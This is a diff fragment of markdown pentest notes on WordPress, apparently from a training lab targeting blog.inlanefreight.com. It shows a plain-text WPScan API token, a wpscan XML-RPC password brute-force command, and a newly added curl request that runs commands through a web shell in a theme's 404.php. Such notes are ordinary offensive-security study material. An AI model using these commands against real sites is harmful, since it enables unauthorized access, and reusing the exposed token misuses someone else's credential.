@@ -40,3 +40,6 @@ API Token for WpScan : 4c8SSanMPgBTRC2hU15g5yFYmQOtzeFqKJECshNg4OU
 ### Bruteforce - XMLRPC
 The command to use is : `wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com`
 
+### RCE
+To use the command : `curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"`
+
